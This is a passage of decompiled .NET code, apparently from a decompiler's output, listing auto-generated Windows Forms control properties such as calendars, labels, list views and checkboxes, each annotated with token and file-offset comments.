		// (get) Token: 0x06000F80 RID: 3968 RVA: 0x0004F74C File Offset: 0x0004D94C
		// (set) Token: 0x06000F81 RID: 3969 RVA: 0x0004F754 File Offset: 0x0004D954
		internal virtual MonthCalendar MonthCalendar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078A RID: 1930
		// (get) Token: 0x06000F82 RID: 3970 RVA: 0x0004F75D File Offset: 0x0004D95D
		// (set) Token: 0x06000F83 RID: 3971 RVA: 0x0004F765 File Offset: 0x0004D965
		internal virtual Label Label22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078B RID: 1931
		// (get) Token: 0x06000F84 RID: 3972 RVA: 0x0004F76E File Offset: 0x0004D96E
		// (set) Token: 0x06000F85 RID: 3973 RVA: 0x0004F776 File Offset: 0x0004D976
		internal virtual ListView ListView34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078C RID: 1932
		// (get) Token: 0x06000F86 RID: 3974 RVA: 0x0004F77F File Offset: 0x0004D97F
		// (set) Token: 0x06000F87 RID: 3975 RVA: 0x0004F787 File Offset: 0x0004D987
		internal virtual PictureBox PictureBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078D RID: 1933
		// (get) Token: 0x06000F88 RID: 3976 RVA: 0x0004F790 File Offset: 0x0004D990
		// (set) Token: 0x06000F89 RID: 3977 RVA: 0x0004F798 File Offset: 0x0004D998
		internal virtual CheckedListBox CheckedListBox47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078E RID: 1934
		// (get) Token: 0x06000F8A RID: 3978 RVA: 0x0004F7A1 File Offset: 0x0004D9A1
		// (set) Token: 0x06000F8B RID: 3979 RVA: 0x0004F7A9 File Offset: 0x0004D9A9
		internal virtual Label Label23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700078F RID: 1935
		// (get) Token: 0x06000F8C RID: 3980 RVA: 0x0004F7B2 File Offset: 0x0004D9B2
		// (set) Token: 0x06000F8D RID: 3981 RVA: 0x0004F7BA File Offset: 0x0004D9BA
		internal virtual DateTimePicker DateTimePicker35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000790 RID: 1936
		// (get) Token: 0x06000F8E RID: 3982 RVA: 0x0004F7C3 File Offset: 0x0004D9C3
		// (set) Token: 0x06000F8F RID: 3983 RVA: 0x0004F7CB File Offset: 0x0004D9CB
		internal virtual ComboBox ComboBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000791 RID: 1937
		// (get) Token: 0x06000F90 RID: 3984 RVA: 0x0004F7D4 File Offset: 0x0004D9D4
		// (set) Token: 0x06000F91 RID: 3985 RVA: 0x0004F7DC File Offset: 0x0004D9DC
		internal virtual CheckedListBox CheckedListBox48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000792 RID: 1938
		// (get) Token: 0x06000F92 RID: 3986 RVA: 0x0004F7E5 File Offset: 0x0004D9E5
		// (set) Token: 0x06000F93 RID: 3987 RVA: 0x0004F7ED File Offset: 0x0004D9ED
		internal virtual ListView ListView35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000793 RID: 1939
		// (get) Token: 0x06000F94 RID: 3988 RVA: 0x0004F7F6 File Offset: 0x0004D9F6
		// (set) Token: 0x06000F95 RID: 3989 RVA: 0x0004F7FE File Offset: 0x0004D9FE
		internal virtual MaskedTextBox MaskedTextBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000794 RID: 1940
		// (get) Token: 0x06000F96 RID: 3990 RVA: 0x0004F807 File Offset: 0x0004DA07
		// (set) Token: 0x06000F97 RID: 3991 RVA: 0x0004F80F File Offset: 0x0004DA0F
		internal virtual CheckBox CheckBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000795 RID: 1941
		// (get) Token: 0x06000F98 RID: 3992 RVA: 0x0004F818 File Offset: 0x0004DA18
		// (set) Token: 0x06000F99 RID: 3993 RVA: 0x0004F820 File Offset: 0x0004DA20
		internal virtual ListView ListView36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000796 RID: 1942
		// (get) Token: 0x06000F9A RID: 3994 RVA: 0x0004F829 File Offset: 0x0004DA29
		// (set) Token: 0x06000F9B RID: 3995 RVA: 0x0004F831 File Offset: 0x0004DA31
		internal virtual CheckedListBox CheckedListBox49 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000797 RID: 1943
		// (get) Token: 0x06000F9C RID: 3996 RVA: 0x0004F83A File Offset: 0x0004DA3A
		// (set) Token: 0x06000F9D RID: 3997 RVA: 0x0004F842 File Offset: 0x0004DA42
		internal virtual ComboBox ComboBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000798 RID: 1944
		// (get) Token: 0x06000F9E RID: 3998 RVA: 0x0004F84B File Offset: 0x0004DA4B
		// (set) Token: 0x06000F9F RID: 3999 RVA: 0x0004F853 File Offset: 0x0004DA53
		internal virtual RadioButton RadioButton13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000799 RID: 1945
		// (get) Token: 0x06000FA0 RID: 4000 RVA: 0x0004F85C File Offset: 0x0004DA5C
		// (set) Token: 0x06000FA1 RID: 4001 RVA: 0x0004F864 File Offset: 0x0004DA64
		internal virtual ProgressBar ProgressBar13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079A RID: 1946
		// (get) Token: 0x06000FA2 RID: 4002 RVA: 0x0004F86D File Offset: 0x0004DA6D
		// (set) Token: 0x06000FA3 RID: 4003 RVA: 0x0004F875 File Offset: 0x0004DA75
		internal virtual DateTimePicker DateTimePicker36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079B RID: 1947
		// (get) Token: 0x06000FA4 RID: 4004 RVA: 0x0004F87E File Offset: 0x0004DA7E
		// (set) Token: 0x06000FA5 RID: 4005 RVA: 0x0004F886 File Offset: 0x0004DA86
		internal virtual MonthCalendar MonthCalendar13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079C RID: 1948
		// (get) Token: 0x06000FA6 RID: 4006 RVA: 0x0004F88F File Offset: 0x0004DA8F
		// (set) Token: 0x06000FA7 RID: 4007 RVA: 0x0004F897 File Offset: 0x0004DA97
		internal virtual PictureBox PictureBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079D RID: 1949
		// (get) Token: 0x06000FA8 RID: 4008 RVA: 0x0004F8A0 File Offset: 0x0004DAA0
		// (set) Token: 0x06000FA9 RID: 4009 RVA: 0x0004F8A8 File Offset: 0x0004DAA8
		internal virtual CheckedListBox CheckedListBox50 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079E RID: 1950
		// (get) Token: 0x06000FAA RID: 4010 RVA: 0x0004F8B1 File Offset: 0x0004DAB1
		// (set) Token: 0x06000FAB RID: 4011 RVA: 0x0004F8B9 File Offset: 0x0004DAB9
		internal virtual CheckedListBox CheckedListBox51 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700079F RID: 1951
		// (get) Token: 0x06000FAC RID: 4012 RVA: 0x0004F8C2 File Offset: 0x0004DAC2
		// (set) Token: 0x06000FAD RID: 4013 RVA: 0x0004F8CA File Offset: 0x0004DACA
		internal virtual Label Label24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A0 RID: 1952
		// (get) Token: 0x06000FAE RID: 4014 RVA: 0x0004F8D3 File Offset: 0x0004DAD3
		// (set) Token: 0x06000FAF RID: 4015 RVA: 0x0004F8DB File Offset: 0x0004DADB
		internal virtual DateTimePicker DateTimePicker37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A1 RID: 1953
		// (get) Token: 0x06000FB0 RID: 4016 RVA: 0x0004F8E4 File Offset: 0x0004DAE4
		// (set) Token: 0x06000FB1 RID: 4017 RVA: 0x0004F8EC File Offset: 0x0004DAEC
		internal virtual ComboBox ComboBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A2 RID: 1954
		// (get) Token: 0x06000FB2 RID: 4018 RVA: 0x0004F8F5 File Offset: 0x0004DAF5
		// (set) Token: 0x06000FB3 RID: 4019 RVA: 0x0004F8FD File Offset: 0x0004DAFD
		internal virtual CheckedListBox CheckedListBox52 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A3 RID: 1955
		// (get) Token: 0x06000FB4 RID: 4020 RVA: 0x0004F906 File Offset: 0x0004DB06
		// (set) Token: 0x06000FB5 RID: 4021 RVA: 0x0004F90E File Offset: 0x0004DB0E
		internal virtual MaskedTextBox MaskedTextBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A4 RID: 1956
		// (get) Token: 0x06000FB6 RID: 4022 RVA: 0x0004F917 File Offset: 0x0004DB17
		// (set) Token: 0x06000FB7 RID: 4023 RVA: 0x0004F91F File Offset: 0x0004DB1F
		internal virtual ListView ListView37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A5 RID: 1957
		// (get) Token: 0x06000FB8 RID: 4024 RVA: 0x0004F928 File Offset: 0x0004DB28
		// (set) Token: 0x06000FB9 RID: 4025 RVA: 0x0004F930 File Offset: 0x0004DB30
		internal virtual CheckBox CheckBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A6 RID: 1958
		// (get) Token: 0x06000FBA RID: 4026 RVA: 0x0004F939 File Offset: 0x0004DB39
		// (set) Token: 0x06000FBB RID: 4027 RVA: 0x0004F941 File Offset: 0x0004DB41
		internal virtual MaskedTextBox MaskedTextBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A7 RID: 1959
		// (get) Token: 0x06000FBC RID: 4028 RVA: 0x0004F94A File Offset: 0x0004DB4A
		// (set) Token: 0x06000FBD RID: 4029 RVA: 0x0004F952 File Offset: 0x0004DB52
		internal virtual CheckBox CheckBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A8 RID: 1960
		// (get) Token: 0x06000FBE RID: 4030 RVA: 0x0004F95B File Offset: 0x0004DB5B
		// (set) Token: 0x06000FBF RID: 4031 RVA: 0x0004F963 File Offset: 0x0004DB63
		internal virtual ListView ListView38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007A9 RID: 1961
		// (get) Token: 0x06000FC0 RID: 4032 RVA: 0x0004F96C File Offset: 0x0004DB6C
		// (set) Token: 0x06000FC1 RID: 4033 RVA: 0x0004F974 File Offset: 0x0004DB74
		internal virtual CheckedListBox CheckedListBox53 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AA RID: 1962
		// (get) Token: 0x06000FC2 RID: 4034 RVA: 0x0004F97D File Offset: 0x0004DB7D
		// (set) Token: 0x06000FC3 RID: 4035 RVA: 0x0004F985 File Offset: 0x0004DB85
		internal virtual ComboBox ComboBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AB RID: 1963
		// (get) Token: 0x06000FC4 RID: 4036 RVA: 0x0004F98E File Offset: 0x0004DB8E
		// (set) Token: 0x06000FC5 RID: 4037 RVA: 0x0004F996 File Offset: 0x0004DB96
		internal virtual RadioButton RadioButton14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AC RID: 1964
		// (get) Token: 0x06000FC6 RID: 4038 RVA: 0x0004F99F File Offset: 0x0004DB9F
		// (set) Token: 0x06000FC7 RID: 4039 RVA: 0x0004F9A7 File Offset: 0x0004DBA7
		internal virtual ProgressBar ProgressBar14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AD RID: 1965
		// (get) Token: 0x06000FC8 RID: 4040 RVA: 0x0004F9B0 File Offset: 0x0004DBB0
		// (set) Token: 0x06000FC9 RID: 4041 RVA: 0x0004F9B8 File Offset: 0x0004DBB8
		internal virtual Button Button11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AE RID: 1966
		// (get) Token: 0x06000FCA RID: 4042 RVA: 0x0004F9C1 File Offset: 0x0004DBC1
		// (set) Token: 0x06000FCB RID: 4043 RVA: 0x0004F9C9 File Offset: 0x0004DBC9
		internal virtual CheckBox CheckBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007AF RID: 1967
		// (get) Token: 0x06000FCC RID: 4044 RVA: 0x0004F9D2 File Offset: 0x0004DBD2
		// (set) Token: 0x06000FCD RID: 4045 RVA: 0x0004F9DA File Offset: 0x0004DBDA
		internal virtual DateTimePicker DateTimePicker38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B0 RID: 1968
		// (get) Token: 0x06000FCE RID: 4046 RVA: 0x0004F9E3 File Offset: 0x0004DBE3
		// (set) Token: 0x06000FCF RID: 4047 RVA: 0x0004F9EB File Offset: 0x0004DBEB
		internal virtual DateTimePicker DateTimePicker39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B1 RID: 1969
		// (get) Token: 0x06000FD0 RID: 4048 RVA: 0x0004F9F4 File Offset: 0x0004DBF4
		// (set) Token: 0x06000FD1 RID: 4049 RVA: 0x0004F9FC File Offset: 0x0004DBFC
		internal virtual MonthCalendar MonthCalendar14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B2 RID: 1970
		// (get) Token: 0x06000FD2 RID: 4050 RVA: 0x0004FA05 File Offset: 0x0004DC05
		// (set) Token: 0x06000FD3 RID: 4051 RVA: 0x0004FA0D File Offset: 0x0004DC0D
		internal virtual Label Label25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B3 RID: 1971
		// (get) Token: 0x06000FD4 RID: 4052 RVA: 0x0004FA16 File Offset: 0x0004DC16
		// (set) Token: 0x06000FD5 RID: 4053 RVA: 0x0004FA1E File Offset: 0x0004DC1E
		internal virtual ListView ListView39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B4 RID: 1972
		// (get) Token: 0x06000FD6 RID: 4054 RVA: 0x0004FA27 File Offset: 0x0004DC27
		// (set) Token: 0x06000FD7 RID: 4055 RVA: 0x0004FA2F File Offset: 0x0004DC2F
		internal virtual PictureBox PictureBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B5 RID: 1973
		// (get) Token: 0x06000FD8 RID: 4056 RVA: 0x0004FA38 File Offset: 0x0004DC38
		// (set) Token: 0x06000FD9 RID: 4057 RVA: 0x0004FA40 File Offset: 0x0004DC40
		internal virtual CheckedListBox CheckedListBox54 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B6 RID: 1974
		// (get) Token: 0x06000FDA RID: 4058 RVA: 0x0004FA49 File Offset: 0x0004DC49
		// (set) Token: 0x06000FDB RID: 4059 RVA: 0x0004FA51 File Offset: 0x0004DC51
		internal virtual CheckedListBox CheckedListBox55 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B7 RID: 1975
		// (get) Token: 0x06000FDC RID: 4060 RVA: 0x0004FA5A File Offset: 0x0004DC5A
		// (set) Token: 0x06000FDD RID: 4061 RVA: 0x0004FA62 File Offset: 0x0004DC62
		internal virtual Label Label26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B8 RID: 1976
		// (get) Token: 0x06000FDE RID: 4062 RVA: 0x0004FA6B File Offset: 0x0004DC6B
		// (set) Token: 0x06000FDF RID: 4063 RVA: 0x0004FA73 File Offset: 0x0004DC73
		internal virtual DateTimePicker DateTimePicker40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007B9 RID: 1977
		// (get) Token: 0x06000FE0 RID: 4064 RVA: 0x0004FA7C File Offset: 0x0004DC7C
		// (set) Token: 0x06000FE1 RID: 4065 RVA: 0x0004FA84 File Offset: 0x0004DC84
		internal virtual ComboBox ComboBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BA RID: 1978
		// (get) Token: 0x06000FE2 RID: 4066 RVA: 0x0004FA8D File Offset: 0x0004DC8D
		// (set) Token: 0x06000FE3 RID: 4067 RVA: 0x0004FA95 File Offset: 0x0004DC95
		internal virtual CheckedListBox CheckedListBox56 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BB RID: 1979
		// (get) Token: 0x06000FE4 RID: 4068 RVA: 0x0004FA9E File Offset: 0x0004DC9E
		// (set) Token: 0x06000FE5 RID: 4069 RVA: 0x0004FAA6 File Offset: 0x0004DCA6
		internal virtual MaskedTextBox MaskedTextBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BC RID: 1980
		// (get) Token: 0x06000FE6 RID: 4070 RVA: 0x0004FAAF File Offset: 0x0004DCAF
		// (set) Token: 0x06000FE7 RID: 4071 RVA: 0x0004FAB7 File Offset: 0x0004DCB7
		internal virtual ListView ListView40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BD RID: 1981
		// (get) Token: 0x06000FE8 RID: 4072 RVA: 0x0004FAC0 File Offset: 0x0004DCC0
		// (set) Token: 0x06000FE9 RID: 4073 RVA: 0x0004FAC8 File Offset: 0x0004DCC8
		internal virtual CheckBox CheckBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BE RID: 1982
		// (get) Token: 0x06000FEA RID: 4074 RVA: 0x0004FAD1 File Offset: 0x0004DCD1
		// (set) Token: 0x06000FEB RID: 4075 RVA: 0x0004FAD9 File Offset: 0x0004DCD9
		internal virtual MaskedTextBox MaskedTextBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007BF RID: 1983
		// (get) Token: 0x06000FEC RID: 4076 RVA: 0x0004FAE2 File Offset: 0x0004DCE2
		// (set) Token: 0x06000FED RID: 4077 RVA: 0x0004FAEA File Offset: 0x0004DCEA
		internal virtual CheckBox CheckBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C0 RID: 1984
		// (get) Token: 0x06000FEE RID: 4078 RVA: 0x0004FAF3 File Offset: 0x0004DCF3
		// (set) Token: 0x06000FEF RID: 4079 RVA: 0x0004FAFB File Offset: 0x0004DCFB
		internal virtual ListView ListView41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C1 RID: 1985
		// (get) Token: 0x06000FF0 RID: 4080 RVA: 0x0004FB04 File Offset: 0x0004DD04
		// (set) Token: 0x06000FF1 RID: 4081 RVA: 0x0004FB0C File Offset: 0x0004DD0C
		internal virtual CheckedListBox CheckedListBox57 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C2 RID: 1986
		// (get) Token: 0x06000FF2 RID: 4082 RVA: 0x0004FB15 File Offset: 0x0004DD15
		// (set) Token: 0x06000FF3 RID: 4083 RVA: 0x0004FB1D File Offset: 0x0004DD1D
		internal virtual ComboBox ComboBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C3 RID: 1987
		// (get) Token: 0x06000FF4 RID: 4084 RVA: 0x0004FB26 File Offset: 0x0004DD26
		// (set) Token: 0x06000FF5 RID: 4085 RVA: 0x0004FB2E File Offset: 0x0004DD2E
		internal virtual RadioButton RadioButton15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C4 RID: 1988
		// (get) Token: 0x06000FF6 RID: 4086 RVA: 0x0004FB37 File Offset: 0x0004DD37
		// (set) Token: 0x06000FF7 RID: 4087 RVA: 0x0004FB3F File Offset: 0x0004DD3F
		internal virtual ProgressBar ProgressBar15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C5 RID: 1989
		// (get) Token: 0x06000FF8 RID: 4088 RVA: 0x0004FB48 File Offset: 0x0004DD48
		// (set) Token: 0x06000FF9 RID: 4089 RVA: 0x0004FB50 File Offset: 0x0004DD50
		internal virtual Button Button12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C6 RID: 1990
		// (get) Token: 0x06000FFA RID: 4090 RVA: 0x0004FB59 File Offset: 0x0004DD59
		// (set) Token: 0x06000FFB RID: 4091 RVA: 0x0004FB61 File Offset: 0x0004DD61
		internal virtual CheckBox CheckBox37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C7 RID: 1991
		// (get) Token: 0x06000FFC RID: 4092 RVA: 0x0004FB6A File Offset: 0x0004DD6A
		// (set) Token: 0x06000FFD RID: 4093 RVA: 0x0004FB72 File Offset: 0x0004DD72
		internal virtual DateTimePicker DateTimePicker41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C8 RID: 1992
		// (get) Token: 0x06000FFE RID: 4094 RVA: 0x0004FB7B File Offset: 0x0004DD7B
		// (set) Token: 0x06000FFF RID: 4095 RVA: 0x0004FB83 File Offset: 0x0004DD83
		internal virtual DateTimePicker DateTimePicker42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007C9 RID: 1993
		// (get) Token: 0x06001000 RID: 4096 RVA: 0x0004FB8C File Offset: 0x0004DD8C
		// (set) Token: 0x06001001 RID: 4097 RVA: 0x0004FB94 File Offset: 0x0004DD94
		internal virtual MonthCalendar MonthCalendar15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CA RID: 1994
		// (get) Token: 0x06001002 RID: 4098 RVA: 0x0004FB9D File Offset: 0x0004DD9D
		// (set) Token: 0x06001003 RID: 4099 RVA: 0x0004FBA5 File Offset: 0x0004DDA5
		internal virtual Label Label27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CB RID: 1995
		// (get) Token: 0x06001004 RID: 4100 RVA: 0x0004FBAE File Offset: 0x0004DDAE
		// (set) Token: 0x06001005 RID: 4101 RVA: 0x0004FBB6 File Offset: 0x0004DDB6
		internal virtual ListView ListView42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CC RID: 1996
		// (get) Token: 0x06001006 RID: 4102 RVA: 0x0004FBBF File Offset: 0x0004DDBF
		// (set) Token: 0x06001007 RID: 4103 RVA: 0x0004FBC7 File Offset: 0x0004DDC7
		internal virtual PictureBox PictureBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CD RID: 1997
		// (get) Token: 0x06001008 RID: 4104 RVA: 0x0004FBD0 File Offset: 0x0004DDD0
		// (set) Token: 0x06001009 RID: 4105 RVA: 0x0004FBD8 File Offset: 0x0004DDD8
		internal virtual CheckedListBox CheckedListBox58 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CE RID: 1998
		// (get) Token: 0x0600100A RID: 4106 RVA: 0x0004FBE1 File Offset: 0x0004DDE1
		// (set) Token: 0x0600100B RID: 4107 RVA: 0x0004FBE9 File Offset: 0x0004DDE9
		internal virtual CheckedListBox CheckedListBox59 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007CF RID: 1999
		// (get) Token: 0x0600100C RID: 4108 RVA: 0x0004FBF2 File Offset: 0x0004DDF2
		// (set) Token: 0x0600100D RID: 4109 RVA: 0x0004FBFA File Offset: 0x0004DDFA
		internal virtual Label Label28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D0 RID: 2000
		// (get) Token: 0x0600100E RID: 4110 RVA: 0x0004FC03 File Offset: 0x0004DE03
		// (set) Token: 0x0600100F RID: 4111 RVA: 0x0004FC0B File Offset: 0x0004DE0B
		internal virtual DateTimePicker DateTimePicker43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D1 RID: 2001
		// (get) Token: 0x06001010 RID: 4112 RVA: 0x0004FC14 File Offset: 0x0004DE14
		// (set) Token: 0x06001011 RID: 4113 RVA: 0x0004FC1C File Offset: 0x0004DE1C
		internal virtual ComboBox ComboBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D2 RID: 2002
		// (get) Token: 0x06001012 RID: 4114 RVA: 0x0004FC25 File Offset: 0x0004DE25
		// (set) Token: 0x06001013 RID: 4115 RVA: 0x0004FC2D File Offset: 0x0004DE2D
		internal virtual CheckedListBox CheckedListBox60 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D3 RID: 2003
		// (get) Token: 0x06001014 RID: 4116 RVA: 0x0004FC36 File Offset: 0x0004DE36
		// (set) Token: 0x06001015 RID: 4117 RVA: 0x0004FC3E File Offset: 0x0004DE3E
		internal virtual MaskedTextBox MaskedTextBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D4 RID: 2004
		// (get) Token: 0x06001016 RID: 4118 RVA: 0x0004FC47 File Offset: 0x0004DE47
		// (set) Token: 0x06001017 RID: 4119 RVA: 0x0004FC4F File Offset: 0x0004DE4F
		internal virtual ListView ListView43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D5 RID: 2005
		// (get) Token: 0x06001018 RID: 4120 RVA: 0x0004FC58 File Offset: 0x0004DE58
		// (set) Token: 0x06001019 RID: 4121 RVA: 0x0004FC60 File Offset: 0x0004DE60
		internal virtual CheckBox CheckBox38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D6 RID: 2006
		// (get) Token: 0x0600101A RID: 4122 RVA: 0x0004FC69 File Offset: 0x0004DE69
		// (set) Token: 0x0600101B RID: 4123 RVA: 0x0004FC71 File Offset: 0x0004DE71
		internal virtual MaskedTextBox MaskedTextBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D7 RID: 2007
		// (get) Token: 0x0600101C RID: 4124 RVA: 0x0004FC7A File Offset: 0x0004DE7A
		// (set) Token: 0x0600101D RID: 4125 RVA: 0x0004FC82 File Offset: 0x0004DE82
		internal virtual CheckBox CheckBox39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D8 RID: 2008
		// (get) Token: 0x0600101E RID: 4126 RVA: 0x0004FC8B File Offset: 0x0004DE8B
		// (set) Token: 0x0600101F RID: 4127 RVA: 0x0004FC93 File Offset: 0x0004DE93
		internal virtual ListView ListView44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007D9 RID: 2009
		// (get) Token: 0x06001020 RID: 4128 RVA: 0x0004FC9C File Offset: 0x0004DE9C
		// (set) Token: 0x06001021 RID: 4129 RVA: 0x0004FCA4 File Offset: 0x0004DEA4
		internal virtual CheckedListBox CheckedListBox61 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DA RID: 2010
		// (get) Token: 0x06001022 RID: 4130 RVA: 0x0004FCAD File Offset: 0x0004DEAD
		// (set) Token: 0x06001023 RID: 4131 RVA: 0x0004FCB5 File Offset: 0x0004DEB5
		internal virtual LinkLabel LinkLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DB RID: 2011
		// (get) Token: 0x06001024 RID: 4132 RVA: 0x0004FCBE File Offset: 0x0004DEBE
		// (set) Token: 0x06001025 RID: 4133 RVA: 0x0004FCC6 File Offset: 0x0004DEC6
		internal virtual ComboBox ComboBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DC RID: 2012
		// (get) Token: 0x06001026 RID: 4134 RVA: 0x0004FCCF File Offset: 0x0004DECF
		// (set) Token: 0x06001027 RID: 4135 RVA: 0x0004FCD7 File Offset: 0x0004DED7
		internal virtual RadioButton RadioButton16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DD RID: 2013
		// (get) Token: 0x06001028 RID: 4136 RVA: 0x0004FCE0 File Offset: 0x0004DEE0
		// (set) Token: 0x06001029 RID: 4137 RVA: 0x0004FCE8 File Offset: 0x0004DEE8
		internal virtual ProgressBar ProgressBar16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DE RID: 2014
		// (get) Token: 0x0600102A RID: 4138 RVA: 0x0004FCF1 File Offset: 0x0004DEF1
		// (set) Token: 0x0600102B RID: 4139 RVA: 0x0004FCF9 File Offset: 0x0004DEF9
		internal virtual NumericUpDown NumericUpDown2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007DF RID: 2015
		// (get) Token: 0x0600102C RID: 4140 RVA: 0x0004FD02 File Offset: 0x0004DF02
		// (set) Token: 0x0600102D RID: 4141 RVA: 0x0004FD0A File Offset: 0x0004DF0A
		internal virtual ListBox ListBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E0 RID: 2016
		// (get) Token: 0x0600102E RID: 4142 RVA: 0x0004FD13 File Offset: 0x0004DF13
		// (set) Token: 0x0600102F RID: 4143 RVA: 0x0004FD1B File Offset: 0x0004DF1B
		internal virtual Button Button13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E1 RID: 2017
